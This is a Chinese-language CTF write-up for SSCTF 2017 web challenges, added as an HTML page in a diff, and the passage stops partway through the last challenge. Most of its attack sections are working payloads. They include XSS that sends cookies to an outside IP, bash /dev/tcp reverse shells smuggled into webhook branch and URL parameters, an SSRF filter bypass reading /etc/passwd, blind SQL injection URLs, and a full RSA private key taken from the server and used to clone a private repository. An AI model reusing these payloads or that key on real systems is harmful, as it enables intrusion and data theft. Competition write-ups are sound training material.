@@ -1,0 +1,1182 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
+<title>Bendawang's Site</title>
+<link href="./SSCTF-2017-WEB-WriteUp/font-awesome.min.css" rel="stylesheet"/>
+<link href="./SSCTF-2017-WEB-WriteUp/screen.css" rel="stylesheet"/>
+<link href="./SSCTF-2017-WEB-WriteUp/prism_okaidia.css" rel="stylesheet"/>
+<link href="./SSCTF-2017-WEB-WriteUp/bendawang.css" rel="stylesheet"/>
+<script src="./SSCTF-2017-WEB-WriteUp/jquery.min.js"></script>
+</head>
+<body class="wrap">
+<header>
+<nav class="mobile-nav show-on-mobiles">
+<ul>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+<div class="show-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img src="./SSCTF-2017-WEB-WriteUp/bendawang.png" style="display:block;width:100%;"/></a>
+</h1>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit test2 hide-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img alt="" height="115" src="./SSCTF-2017-WEB-WriteUp/bendawang.png" width="449"/></a>
+</h1>
+</div>
+<nav class="main-nav unit test1 hide-on-mobiles">
+<ul>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+</div>
+</header>
+<script>
+$('document').ready(function(){
+    $('li[class]:eq(4)').attr('class','current');
+});
+</script>
+<section class="docs">
+<div class="grid">
+<!--移动端-->
+<div class="show-on-mobiles">
+<div class="article-info profile-block">
+<div class="article-info-block">
+               55
+               <span>文章</span>
+</div>
+<div class="article-info-block">
+               5
+               <span>标签</span>
+</div>
+</div>
+<div class="profile-block social-links">
+<table>
+<tbody><tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i></a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i></a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i></a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody></table>
+</div>
+<div class="whole show-on-mobiles">
+<article class="bdw_article">
+<div class="Bendawang" id="Bendawang_mobile">
+<b id="Bendawang_toggle_mobile" title="收起">目录[+]</b></div></article></div></div></div></section></body></html>
+<div class="Bendawang_content" id="Bendawang_content_mobile"></div>
+
+<br/>
+<br/>
+<h2 id="web100">web 100 捡吗？</h2>
+<p style="max-width:100%;height:auto;">这道坑题目，服务老是崩不说，感觉价值不大。。。
+根据提示有一台服务在<code style="max-width:100%;height:auto;">10.23.173.0</code>网段，扫一下很容易就发现在<code style="max-width:100%;height:auto;">10.23.173.190</code>,然后这个ip下又一个<code style="max-width:100%;height:auto;">news.php</code>也有url可以跳转。然后再根据提示说是有三个服务器，最后一个是ftp，现在我们有两个了就差最后一个了。然后就扫呗，中途题目崩溃的时候看到过这样的过滤代码：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php 
+if (isset($_GET[&amp;apos;url&amp;apos;]))
+{
+$link = $_GET[&amp;apos;url&amp;apos;];
+$link = str_replace("dict","_", $link);
+$link = str_replace("file","_", $link);
+$link = str_replace("ftp","_", $link);
+$link = str_replace("ftps","_", $link);
+$link = str_replace("gopher","_", $link);
+$link = str_replace("http","_", $link);
+$link = str_replace("https","_", $link);
+$link = str_replace("imap","_", $link);
+$link = str_replace("imaps","_", $link);
+$link = str_replace("ldap","_", $link);
+$link = str_replace("ldaps","_", $link);
+$link = str_replace("pop3","_", $link);
+$link = str_replace("pop3s","_", $link);
+$link = str_replace("rtmp","_", $link);
+$link = str_replace("rtsp","_", $link);
+$link = str_replace("smtp","_", $link);
+$link = str_replace("smtps","_", $link);
+$link = str_replace("telnet","_", $link);
+$link = str_replace("tftp","_", $link);
+$link = str_replace(".a","_", $link);
+$link = str_replace(".b","_", $link);
+$link = str_replace(".c","_", $link);
+$link = str_replace(".d","_", $link);
+$link = str_replace(".f","_", $link);
+$link = str_replace(".g","_", $link);
+$link = str_replace(".h","_", $link);
+$link = str_replace(".i","_", $link);
+$link = str_replace(".k","_", $link);
+$link = str_replace(".l","_", $link);
+$link = str_replace(".m","_", $link);
+$link = str_replace(".n","_", $link);
+$link = str_replace(".o","_", $link);
+$link = str_replace(".q","_", $link);
+$link = str_replace(".r","_", $link);
+$link = str_replace(".s","_", $link);
+$link = str_replace(".u","_", $link);
+$link = str_replace(".v","_", $link);
+$link = str_replace(".w","_", $link);
+$link = str_replace(".x","_", $link);
+$link = str_replace(".y","_", $link);
+$link = str_replace(".z","_", $link);
+$curlobj = curl_init($link);
+curl_setopt($curlobj, CURLOPT_FILE, $fp);
+curl_setopt($curlobj, CURLOPT_HEADER, 0);
+curl_exec($curlobj);
+curl_close($curlobj);
+}
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">所以知道<code style="max-width:100%;height:auto;">ftp</code>杯过滤了，大写就可以绕过，然后就是用burp跑就行了，后来跟新了提示：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590e0488c65a904f8300000d.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">这么清晰，直接构造访问</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590e04a9c65a904f8300000e.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">发现flag.txt,访问获得flag</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590e04bdc65a904f8300000f.png" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="web200">web 200 弹幕</h2>
+<p style="max-width:100%;height:auto;">打开发现是个websocket获取数据，然后每个人连上去就会有一个welcome提示,大概像这样：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">Welcome, 1.85**&lt;img src="/static/images/welcome.gif" onload="c=encodeURIComponent(document.cookie);if(c.length&gt;32){a=new Image();a.src=&amp;apos;/xssHentai/request/1/?body=&amp;apos;+c;}"&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">然后觉得这个链接很可疑，访问下是个ok，然后怎么改body都是ok，
+再访问下<code style="max-width:100%;height:auto;">http://117.34.71.7/xssHentai</code>，发现是个登陆页面，弱密码<code style="max-width:100%;height:auto;">admin:admin</code>直接登陆，然后发现
+<br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590d7273c65a904f83000002.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">让我们往<code style="max-width:100%;height:auto;">3</code>发送请求，发现每往3发送一个，这个页面就会更新，再根据cookie的提示
+<br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590d72d8c65a904f83000003.png" style="max-width:100%;height:auto;"/><br/>
+知道往1发就是管理员，
+最后payload如下：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://117.34.71.7/xssHentai/request/1/?body=%3Cscript%3E%24.get%28%22http%3A%2f%2f104.160.43.154%3A8000%2fxss%2f%3Fa%3D%22%2bdocument.cookie%29%3C%2fscript%3E
+</code></pre>
+<p style="max-width:100%;height:auto;">flag截图：
+<br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590d733bc65a904f83000008.png" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="web300">web 300 白吗?全是套路</h2>
+<p style="max-width:100%;height:auto;">这个题其实是利用web1发现的点做的，web1扫内网的时候，发现这样</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://120.132.21.19/news.php?url=10.23.173.190/news.php?url=172.17.0.1/
+</code></pre>
+<p style="max-width:100%;height:auto;">直接到web3也就是本题来了，加上web1发现的过滤，知道可以用<code style="max-width:100%;height:auto;">file</code>协议大写绕过就能任意读取本题的文件</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://120.132.21.19/news.php?url=10.23.173.190/news.php?url=File:///etc/passwd
+</code></pre>
+<p style="max-width:100%;height:auto;">读取了一堆文件也没发现什么，倒是在<code style="max-width:100%;height:auto;">/var/www/submit.php</code>目录发现了可以伪造ip进行insert的盲注</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+
+header("CONTENT-TYPE:text/html;charset=UTF-8");
+define("HOST","127.0.0.1");
+define("USERNAME","root");
+define("PASSWORD","");
+$con=new mysqli(HOST,USERNAME,PASSWORD,"ctf1");
+if(!$con){
+    echo $con-&gt;error;
+    exit("aaaa");
+}
+if(!$con-&gt;select_db("ctf1")){
+    echo $con-&gt;error;
+}
+if(!$con-&gt;query("SET NAMES utf8")){
+    echo $con-&gt;error;
+}
+
+$xss=$_POST["sub"];
+$str = addslashes($xss);
+
+/**********鑾峰彇IP************/
+class Action  
+{  
+
+    function get_outer()  
+    {  
+        $url = &amp;apos;http://www.ip138.com/ip2city.asp&amp;apos;;  
+        $info = file_get_contents($url);  
+        preg_match(&amp;apos;|&lt;center&gt;(.*?)&lt;/center&gt;|i&amp;apos;, $info, $m);  
+        return $m[1];  
+    }  
+
+    function get_inter()  
+    {  
+        $onlineip = &amp;apos;&amp;apos;;  
+        if (getenv(&amp;apos;HTTP_CLIENT_IP&amp;apos;) &amp;&amp; strcasecmp(getenv(&amp;apos;HTTP_CLIENT_IP&amp;apos;), &amp;apos;unknown&amp;apos;)) {  
+            $onlineip = getenv(&amp;apos;HTTP_CLIENT_IP&amp;apos;);  
+        } elseif (getenv(&amp;apos;HTTP_X_FORWARDED_FOR&amp;apos;) &amp;&amp; strcasecmp(getenv(&amp;apos;HTTP_X_FORWARDED_FOR&amp;apos;), &amp;apos;unknown&amp;apos;)) {  
+            $onlineip = getenv(&amp;apos;HTTP_X_FORWARDED_FOR&amp;apos;);  
+        } elseif (getenv(&amp;apos;REMOTE_ADDR&amp;apos;) &amp;&amp; strcasecmp(getenv(&amp;apos;REMOTE_ADDR&amp;apos;), &amp;apos;unknown&amp;apos;)) {  
+            $onlineip = getenv(&amp;apos;REMOTE_ADDR&amp;apos;);  
+        } elseif (isset($_SERVER[&amp;apos;REMOTE_ADDR&amp;apos;]) &amp;&amp; $_SERVER[&amp;apos;REMOTE_ADDR&amp;apos;] &amp;&amp; strcasecmp($_SERVER[&amp;apos;REMOTE_ADDR&amp;apos;], &amp;apos;unknown&amp;apos;)) {  
+            $onlineip = $_SERVER[&amp;apos;REMOTE_ADDR&amp;apos;];  
+        }  
+        return $onlineip;  
+    }  
+}  
+$p = new Action();
+$intip = $p-&gt;get_inter();
+$outip2= $intip;
+@mkdir("/tmp/ids",0777,true);
+$sql="insert into ctf1(xss,ip,time,wai_ip) values(&amp;apos;$str&amp;apos;,&amp;apos;$intip&amp;apos;,NOW(),&amp;apos;$outip2&amp;apos;)";
+
+if($str=$con-&gt;query($sql)){
+    echo "&lt;script&gt;alert(&amp;apos;success&amp;apos;);window.location.href=&amp;apos;index.php&amp;apos;&lt;/script&gt;";
+    $insertid = mysqli_insert_id($con);
+    file_put_contents("/tmp/ids/".$insertid,"a");
+}
+else {
+    echo "&lt;script&gt;alert(&amp;apos;fail&amp;apos;);&lt;/script&gt;";
+}
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">后来也没有发现表啊库啊里面有什么有用的东西，后来随手提交了个这个请求</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">POST /submit.php HTTP/1.1
+Host: 120.132.20.149
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 68
+Connection: close
+Client-Ip:&lt;script src="http://104.160.43.154:8000"&gt;&lt;/script&gt;
+Upgrade-Insecure-Requests: 1
+
+sub=&lt;script src="http://104.160.43.154:8000"&gt;&lt;/script&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">发现竟然弹到我的xss平台来了，如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590ec6be93742a2f44000001.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">然后直接去读这个php，发现没有什么可疑的东西，本来打算接着看打xss，结果突然发现这个一长串的php里面引用了另一个<code style="max-width:100%;height:auto;">js.php</code>，一看就很诡异，直接访问</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590ec76193742a2f44000003.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">然后就发现flag了。。。意料之外。。。</p>
+<h2 id="web500webhook">web 500 WebHook</h2>
+<p style="max-width:100%;height:auto;">好吧这道题我一定要好好的写个Writeup,这道题就是和出题人的一个博弈，三次命令执行，出题人改了三次题，还好在最后一次改之前成功获取到了flag。
+<br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590df970c65a904f83000009.png" style="max-width:100%;height:auto;"/><br/></p>
+<h3 id="10">命令执行1.0</h3>
+<p style="max-width:100%;height:auto;">最开始拿到题目是一个github项目，拿下来看源码，发现其中build函数里面很多命令执行，然后调用build函数的push函数最开始是这样子</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">@app.route("/push", methods=[&amp;apos;GET&amp;apos;, &amp;apos;POST&amp;apos;])
+def push():
+    if request.method == &amp;apos;GET&amp;apos;:
+        return &amp;apos;OK&amp;apos;
+    elif request.method == &amp;apos;POST&amp;apos; and request.host.split(":")[0] == "webhook.ssctf.seclover.com":
+        post = json.loads(request.data)
+        if &amp;apos;repository&amp;apos; not in post:
+            abort(403)
+        repos = json.loads(open(&amp;apos;repos.json&amp;apos;).read())
+        name = post[&amp;apos;repository&amp;apos;]["name"]
+
+        match = re.match(r"refs/heads/(?P&lt;branch&gt;.*)", post[&amp;apos;ref&amp;apos;])
+        if match:
+            branch = match.groupdict()[&amp;apos;branch&amp;apos;]
+            before = post.get("before") or ""
+            msg = "recived push repo:{name} with before \n"
+            msg += json.dumps(before, indent=4)
+            webhooklog.info(msg.format(**locals()))
+        else:
+            abort(403)
+        if repos.get(name):
+            if not logs.get(name):
+                logs[name] = getlog(name)
+            url = repos[name].get("url", "")
+            log = logs[name]
+            pool.apply_async(build, (name, url, branch, log))
+
+        else:
+            abort(403)
+
+    return &amp;apos;OK&amp;apos;
+</code></pre>
+<p style="max-width:100%;height:auto;">发现参数branch是我们可以控制的，通过正则来匹配，正则使很容易绕过的，我们只需要让<code style="max-width:100%;height:auto;">ref=refs/heads/P&lt;branch&gt;;curl http://104.160.43.154:12345</code>就能成功执行命令，而且这里也没有身份验证，所以直接构造请求发往<code style="max-width:100%;height:auto;">/push</code>页面就行了：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">{"repository":{"name":"flag"},"ref":"refs/heads/P&lt;branch&gt;;curl http://104.160.43.154:12345"}
+</code></pre>
+<p style="max-width:100%;height:auto;">ps:这个flag用户是查看<code style="max-width:100%;height:auto;">/webhooklog</code>页面看到的用户名。
+然后直接构造反弹shell就可以了。</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">{"repository":{"name":"flag"},"ref":"refs/heads/P&lt;branch&gt;;/bin/bash -i &gt;&amp; /dev/tcp/104.160.43.154/12345 0&gt;&amp;1"}
+</code></pre>
+<p style="max-width:100%;height:auto;">成功反弹shell之后。折腾了半天没有找到flag，看到那个<code style="max-width:100%;height:auto;">repos.json</code>里面有个<code style="max-width:100%;height:auto;">https://git.coding.net/ljgame/flag.git</code>,访问下发现是个私有的项目看不了。然后就开始遍地找flag，最后服务器重启修复这个branch参数的命令执行漏洞，修复如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590dfe4bc65a904f8300000a.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">直接把branch写死了。。。。。不过已经把源码整个文件夹都dump下来了。</p>
+<h3 id="20">命令执行2.0</h3>
+<p style="max-width:100%;height:auto;">重新审计发现就在刚才源码调用<code style="max-width:100%;height:auto;">build</code>的地方，和branch参数同时传入的还有url参数，url参数来自哪儿？</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">@app.route("/addrepo", methods=[&amp;apos;GET&amp;apos;])
+def addrepo():
+    repos = json.loads(open(&amp;apos;repos.json&amp;apos;, &amp;apos;rb&amp;apos;).read())
+    repo = request.args.get(&amp;apos;repo&amp;apos;, "")
+    key = request.args.get(&amp;apos;key&amp;apos;, "")
+    url = request.args.get(&amp;apos;url&amp;apos;, "")
+    password = request.args.get(&amp;apos;pass&amp;apos;, "")
+    if key != md5.md5(repo + app.config[&amp;apos;SECRET_KEY&amp;apos;] * 20 + repo).hexdigest():
+        abort(403)
+    if repo in repos:
+        abort(403)
+    repos[repo] = {
+        "url": url,
+        "pass": md5.md5(password + app.config[&amp;apos;SECRET_KEY&amp;apos;]).hexdigest()
+    }
+    open(&amp;apos;repos.json&amp;apos;, &amp;apos;wb&amp;apos;).write(json.dumps(repos))
+    return "OK"
+</code></pre>
+<p style="max-width:100%;height:auto;">这里直接接受了传入的url参数，不过这里做了验证<code style="max-width:100%;height:auto;">key == md5.md5(repo + app.config[&amp;apos;SECRET_KEY&amp;apos;] * 20 + repo).hexdigest()</code>，但是第一次dump了源码，知道了这个<code style="max-width:100%;height:auto;">SECRET_KEY</code>实际是<code style="max-width:100%;height:auto;">ssctf</code>,所以很容易构造绕过。payload如下：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://webhook.ssctf.seclover.com:8000/addrepo?repo=test&amp;url=test%3B%2fbin%2fbash%20-i%20%3E%26%20%2fdev%2ftcp%2f104.160.43.154%2f12345%200%3E%261&amp;pass=test&amp;key=9a674ed2d9aae9daa8304fb4ef1f911a
+</code></pre>
+<p style="max-width:100%;height:auto;">所以又一次成功弹了shell,但是还是没有找到flag。直到再一次修复。。</p>
+<h3 id="30">命令执行3.0</h3>
+<p style="max-width:100%;height:auto;">我们发现这个新的更新改动对url格式做了限制，</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">@app.route("/addrepo", methods=[&amp;apos;GET&amp;apos;])
+def addrepo():
+    repos = json.loads(open(&amp;apos;repos.json&amp;apos;, &amp;apos;rb&amp;apos;).read())
+    repo = request.args.get(&amp;apos;repo&amp;apos;, "")
+    key = request.args.get(&amp;apos;key&amp;apos;, "")
+    url = request.args.get(&amp;apos;url&amp;apos;, "")
+    password = request.args.get(&amp;apos;pass&amp;apos;, "")
+    if key != md5.md5(repo + app.config[&amp;apos;SECRET_KEY&amp;apos;] * 20 + repo).hexdigest():
+        abort(403)
+    if repo in repos:
+        abort(403)
+    m = re.search(
+        r&amp;apos;https://(github\.com|git\.coding\.net)/\w+/(\w+)\.git&amp;apos;, url)
+    if not m:
+        abort(403)
+    if m.group(2) != repo:
+        abort(403)
+    repos[repo] = {
+        "url": url,
+        "pass": md5.md5(password + app.config[&amp;apos;SECRET_KEY&amp;apos;]).hexdigest()
+    }
+    open(&amp;apos;repos.json&amp;apos;, &amp;apos;wb&amp;apos;).write(json.dumps(repos))
+    return "OK"
+</code></pre>
+<p style="max-width:100%;height:auto;">但是仍然轻松绕过：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://webhook.ssctf.seclover.com:8000/addrepo?repo=aaaaa&amp;url=https%3A%2f%2fgithub.com%2ftest%2faaaaa.git%3B%2fbin%2fbash%20-i%20%3E%26%20%2fdev%2ftcp%2f104.160.43.154%2f12345%200%3E%261&amp;pass=test&amp;key=de14479df6aec67e8e69187355533c36
+</code></pre>
+<p style="max-width:100%;height:auto;">又一次拿到shell。。
+最后想到了用服务器上的私玥搞下来直接去看看远程的这个<code style="max-width:100%;height:auto;">flag.git</code>仓库，搞下来的私玥是这个</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAsYUDgOI2fRHJyf4Cw1CbvADog01Dg02/HznuAQAGCv8N4Z4n
+gZ/DmB6x33470JzdF2JxXrcHJkS7h2T4UICHJaIAs/UGGfCTHSx11veWXpqyhPEJ
+p1VhPcP9/rWLGIPBnNJLv1bFW90afU8CboELz0GlX8+N9XA2r+6hZengMayd/a3A
+X44MqMQDTQp4wFWNF/CTsUIWD70lhwKHKTkt+isRh6bkWRa2rFvl4ODvUb0iA6jT
+h+5ee1pVmzG4BGJmGQlhUHO38/3bytLNbi14uKziJAM6Z3sy/R3BwzGW3/X3ieHg
+skDfu4v9gyCsX7XjnRzPXsOiKdga8RDJgataFwIDAQABAoIBAQCMv8PpWnKNc58k
+0otqRO1VgPrZsFcJMomIvqugi14/Nb7R1k3Ijt3MLPonE7VlUBpUQi9VQ5UdmH1/
+emUPnviItAwOowV1Z7Oc+/Vqvd+xnsJQebSHwkBZcp5eZ56jj0PhjTOVv7y3e3VX
+SV/KMfMlHw16C9yob5JMp828OlURzFK2KzjUSXmYJQQw3AXcN7yYwkEGEjBCLhI3
+HMWlEF5BzwuDbIJTNROv4jQsZOH1oNXtHCQGZPH3G9ewsGaQ2x5FYaI86AUCN3wX
+wnR66JGGF6JYNiB93Ubh8znP/gbGfMh4DHHBQWKKT+u6v/vJOinTfDsp1FuN3NI+
+ZitRWhcRAoGBAOMc+Rb3oHCEPZpmxee4ksASHk6wFZHbKrAW+t2mFyDPO45Wxwim
+2PAndhjSQYzcgmh77HhYCHdv1/5n0Ozp1Uq7Udpaqqs82FGbt9MKLp660J4cBoX8
+zi6UBLSC77Sm42V24Z/vkw3OJLs2iYeP5pfKKhk8X6x/jiR02wgol7LFAoGBAMgZ
+OZGXw8NpALpHaTerR4L99swIicliSkBckxVZIMsmPS4QwyMLuPo3BvKJTS+pT3BM
+5CX3bHfPZ5W3tUymQOzQ/eRRZovNhWvW4rbZWAMs54uyBi4inpGLP8HEr+6Yoe6k
+c6L/+Jkfz5OEXyUAu14VgdkS897zvmtKa0AiKDcrAoGBALlBHuXfI53kIKPbhT8Y
+zYuiu9oPw+hv0AhHFmbKXj9DCx92JXAnOPncFnb0usd971nvC9q2ZGGYd6VrZX56
+1qLY3VGxd1mqjgEzdeTNf222kQkHb0LIDh7sWlIsI/9FymMvb6eYMmmmZ0vWlqRf
+ewcBvwlKt/frLDUMpMWo5uTJAoGAcpDWwEBninONQhpu6Lu9ZwenjWx6D36iSrV2
+VSvBte6/6qcYQvGMSF7HMIhiVB6ZaA/uNLq0NOjgQv165VbvJ2gFZfshPnw+nt7a
+0ZwhYzgLnpUgKrwRk/1pVLUbkf18AZnQx4vNN0baX3jTzOjdXmHsBXBvhsCBzwY9
+3+tuoR8CgYAzG5qFU+B7clDETn2qj+8u2NNHif5PUeuQTfH1z7SM7aOkdkGjilnh
+OvvdME7gILAlm/qZdTZEzIegGRApM2UI3foMMg9bnxRbWybCJh21LDK4hntJCVWO
+P/eObKg32p89IlTOXf/NsRABswyhOLzbqsbGY+sD/Q2UBMbhUVWU3A==
+-----END RSA PRIVATE KEY-----
+</code></pre>
+<p style="max-width:100%;height:auto;">放到本地，把本地<code style="max-width:100%;height:auto;">~/.ssh</code>下的东西移开，然后新建一个<code style="max-width:100%;height:auto;">id_rsa</code>,记得要把权限改成<code style="max-width:100%;height:auto;">600</code>，然后执行</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">ssh -T git@git.coding.net -i id_rsa
+</code></pre>
+<p style="max-width:100%;height:auto;">收到类似这样的回复</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">The authenticity of host &amp;apos;git.coding.net (218.75.224.59)&amp;apos; can&amp;apos;t be established.
+RSA key fingerprint is SHA256:jok3FH7q5LJ6qvE7iPNehBgXRw51ErE77S0Dn+Vg/Ik.
+Are you sure you want to continue connecting (yes/no)? ys
+Please type &amp;apos;yes&amp;apos; or &amp;apos;no&amp;apos;: yes
+Warning: Permanently added &amp;apos;git.coding.net,218.75.224.59&amp;apos; (RSA) to the list of known hosts.
+Coding.net Tips : [Hello! You&amp;apos;ve connected to Coding.net via SSH. This is a deploy key.]
+</code></pre>
+<p style="max-width:100%;height:auto;">说明成功了,然后就可以管理这个flag.git项目了,克隆下来</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">git clone git@git.coding.net:ljgame/flag.git
+</code></pre>
+<p style="max-width:100%;height:auto;">发现有个flag.txt
+<br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590e010bc65a904f8300000b.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">做完之后不久，题目又修复命令执行。。。
+把正则换成这样</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590e015cc65a904f8300000c.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">这下应该很难绕过了。。。不过跟我没啥关系辣...XD...</p>
+<h2 id="web500cloverseclogos">web 500 CloverSec Logos</h2>
+<p style="max-width:100%;height:auto;">这道题首先进去简单逛了一圈，然后，后来在<code style="max-width:100%;height:auto;">picture.php</code>的id参数发现注入,poc如下：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://60.191.205.80/picture.php?id="%2b(select(sleep(6)))%2b"
+</code></pre>
+<p style="max-width:100%;height:auto;">然后就可以利用了，</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://60.191.205.80/picture.php?id="%2b(if(substring(database(),1,1)&lt;&amp;apos;z&amp;apos;,1,0))%2b"
+</code></pre>
+<p style="max-width:100%;height:auto;">根据官方提示，有一个<code style="max-width:100%;height:auto;">user</code>表，字段是<code style="max-width:100%;height:auto;">username</code>,<code style="max-width:100%;height:auto;">password</code>，脚本都懒得写了，
+如下：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://60.191.205.80/picture.php?id="%2b(if(substring(username,1,1)&lt;&amp;apos;z&amp;apos;,1,0))%2b"
+</code></pre>
+<p style="max-width:100%;height:auto;">直接上burp跑，
+拿到用户名是<code style="max-width:100%;height:auto;">admin</code>：
+<br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590ebedb25ffbe56c4000000.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">password需要注意，这里过滤了<code style="max-width:100%;height:auto;">or</code>，所以需要双写绕过</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://60.191.205.80/picture.php?id="%2b(if(substring(passwoorrd,1,1)&lt;&amp;apos;z&amp;apos;,1,0))%2b"
+</code></pre>
+<p style="max-width:100%;height:auto;">跑出来是20位的密码<code style="max-width:100%;height:auto;">14aceb3fc5992cef3d97</code>
+<br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590ebf2f25ffbe56c4000001.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">猜测和<code style="max-width:100%;height:auto;">dedecms</code>一样，去掉头三位和末一位<code style="max-width:100%;height:auto;">ceb3fc5992cef3d9</code>，md5解密出来是<code style="max-width:100%;height:auto;">admin^g</code>
+就能登陆进去了。
+然后进去之后看cookie拿到tip说token会被反序列化，根据提示说是有vim的残留文件，访问<code style="max-width:100%;height:auto;">.index.php.swp</code>,发现并没有什么有用的信息，，后来访问<code style="max-width:100%;height:auto;">index.php.swp</code>才拿到真正有用的文件，这里截出重点部分如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">if(isset($_GET[&amp;apos;action&amp;apos;])&amp;&amp;$_GET[&amp;apos;action&amp;apos;]==&amp;apos;imformation&amp;apos;)
+{
+    if(isset($_COOKIE[&amp;apos;token&amp;apos;]))
+    {
+      $secret=$_GET[&amp;apos;secret&amp;apos;];
+      $token =$_COOKIE[&amp;apos;token&amp;apos;];
+      if(isset($secret)&amp;&amp;(file_get_contents($secret,&amp;apos;r&amp;apos;)==="1234"))
+      {
+        echo "hello Hacker!&lt;br&gt;";
+        include("include.php");
+        echo ssctf_unserialize($token);
+      }
+      else
+      {
+        echo "You are not Hacker ! ";
+      }
+    }
+    else{
+      setcookie("token",&amp;apos;&amp;apos;);
+      echo &amp;apos;&lt;h2 style="text-align:center;"&gt;Welcome&lt;/h2&gt;&amp;apos;;
+      echo &amp;apos;&lt;div&gt;&lt;h4&gt;User imformation&lt;/h4&gt;&lt;ul&gt;&amp;apos;;
